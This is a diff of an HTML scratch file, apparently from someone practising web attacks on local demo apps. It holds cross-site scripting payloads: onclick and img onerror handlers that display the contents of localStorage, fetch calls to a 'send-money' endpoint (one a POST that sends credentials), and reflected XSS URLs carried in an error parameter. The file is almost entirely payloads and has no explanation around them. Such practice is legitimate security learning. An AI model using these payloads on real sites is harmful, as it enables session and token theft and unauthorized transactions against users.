@@ -1,7 +1,10 @@
 <a href="#" onclick="alert(JSON.stringify(localStorage))">click me</a>
 
-
-<a href="#" onclick="fetch('http://localhost:5175/send-money').then(x => x.json()).then(x => console.log(x))">Click me</a>
+<a
+  href="#"
+  onclick="fetch('http://localhost:5175/send-money').then(x => x.json()).then(x => console.log(x))"
+  >Click me</a
+>
 
 <!-- import { useState } from "react";
 // localStorage.setItem("token", 123);
@@ -19,7 +22,6 @@ function App() {
 
 export default App; -->
 
-
 <a
   href="#"
   onClick="fetch('http://localhost:4000/send-money')
@@ -29,27 +31,33 @@ export default App; -->
   Click me
 </a>
 
-
-
 <img src onerror=alert('hey') />
-<img src onerror=alert(JSON.stringify(localStorage)) />
+<img src onerror="alert(JSON.stringify(localStorage))" />
 
-<img src onerror="fetch('http://localhost:4000/send-money')
+<img
+  src
+  onerror="fetch('http://localhost:4000/send-money')
     .then(response => response.json())
-    .then(data => console.log(data));" />
+    .then(data => console.log(data));"
+/>
 
-
-<img src onerror="
+<img
+  src
+  onerror="
   fetch('http://localhost:4000/send-money', {
     method: 'POST',
     credentials: 'include'
   })
   .then(response => response.json())
   .then(data => console.log(data));
-">
-
-
-
+"
+/>
 
 <!--  for realistic form  -->
-  http://localhost:5173/?error=<img src=x onerror="alert('XSS')">
+http://localhost:5173/?error=<img src="x" onerror="alert('XSS')" />
+
+
+
+
+
+http://localhost:5173/?error=<img src onerror=alert(JSON.stringify(localStorage)) />
